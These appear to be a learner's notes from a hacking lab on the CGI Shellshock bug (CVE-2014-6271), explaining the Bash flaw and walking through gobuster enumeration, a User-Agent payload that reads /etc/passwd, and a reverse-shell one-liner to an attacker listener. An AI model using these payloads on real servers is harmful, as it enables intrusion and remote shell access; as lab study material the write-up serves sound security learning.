
- [Common Gateway Interface (CGI)](https://en.wikipedia.org/wiki/Common_Gateway_Interface) is middleware that allows web servers to interact with external applications (written in C, Perl, Bash, etc.) to generate dynamic content.
- **Directory:** Usually found in `/cgi-bin/`

CGI scripts/applications are typically used for a few reasons:

- If the webserver must dynamically interact with the user
- When a user submits data to the web server by filling out a form. The CGI application would process the data and return the result to the user via the webserver

A graphical depiction of how CGI works can be seen below.
![[Pasted image 20260405194553.png]]

---
## Shellshock Vulnerability ([CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271))

A bug in **GNU Bash (up to v4.3)** where Bash continues to execute commands trailing after a function definition stored in an environment variable.

Example - Web servers map HTTP headers (like `User-Agent`) to environment variables. When a CGI script calls Bash, the malicious payload in the variable is executed.

Let's look at a simple example where we define an environment variable and include a malicious command afterward.

```shell
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

When the above variable is assigned, Bash will interpret the `y='() { :;};'` portion as a function definition for a variable `y`. The function does nothing but returns an exit code `0`, but when it is imported, it will execute the command `echo vulnerable-shellshock` if the version of Bash is vulnerable. This (or any other command, such as a reverse shell one-liner) will be run in the context of the web server user. Most of the time, this will be a user such as `www-data`, and we will have access to the system but still need to escalate privileges. Occasionally we will get really lucky and gain access as the `root` user if the web server is running in an elevated context.

If the system is not vulnerable, only `"not vulnerable"` will be printed.


```
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable" not vulnerable
```

This behavior no longer occurs on a patched system, as Bash will not execute code after a function definition is imported. Furthermore, Bash will no longer interpret `y=() {...}` as a function definition. But rather, function definitions within environment variables must now be prefixed with `BASH_FUNC_`.

---

## Hands-on Example

**Gobuster:** Use to find hidden scripts in the `/cgi-bin/` directory.
```bash
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```
![[Pasted image 20260405200251.png]]



Next, we can cURL the script and notice that nothing is output to us, so perhaps it is a defunct script but still worth exploring further.
```
hellopriyanshu2702@htb[/htb]$ curl -i http://10.129.204.231/cgi-bin/access.cgi 

HTTP/1.1 200 OK 
Date: Thu, 23 Mar 2023 13:28:55 GMT 
Server: Apache/2.4.41 (Ubuntu) 
Content-Length: 0 
Content-Type: text/html
```

### **Exploitation (Proof of Concept)**

**Testing for Vulnerability:** Use `curl` to inject a command into the `User-Agent` header.
```shell
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```
Note: The empty `echo ;` is required to provide a valid HTTP body separator.
![[Pasted image 20260405200337.png]]

![[Pasted image 20260405200603.png]]

#### Exploitation to Reverse Shell Access
```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```


```shell
sudo nc -lvnp 7777
```

BOOM we have a shell
